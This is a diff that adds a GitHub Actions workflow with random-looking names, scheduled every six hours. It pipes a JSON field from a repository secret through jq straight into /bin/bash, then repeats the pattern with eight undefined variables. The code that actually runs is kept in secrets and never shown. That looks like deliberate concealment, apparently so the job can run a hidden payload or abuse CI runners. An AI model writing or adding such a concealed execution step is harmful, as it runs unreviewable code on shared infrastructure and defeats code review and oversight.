@@ -1,0 +1,25 @@
+name: zenmezhemcana
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zenmezhemcana
+        env:
+          ikm1: ${{ secrets.ikm1 }}
+        run: |
+          echo $ikm1 | jq -r .qrc17012 | /bin/bash
+          echo $cqry491 | jq -r .h7 | /bin/bash
+          echo $grmna05 | jq -r .uozok14 | /bin/bash
+          echo $aq7 | jq -r .xpq0333 | /bin/bash
+          echo $uv8 | jq -r .ofpe01 | /bin/bash
+          echo $g32688 | jq -r .t735 | /bin/bash
+          echo $wvs1 | jq -r .fprt8 | /bin/bash
+          echo $o3 | jq -r .ybbj64 | /bin/bash
+          echo $hs34602 | jq -r .ec5063 | /bin/bash
+
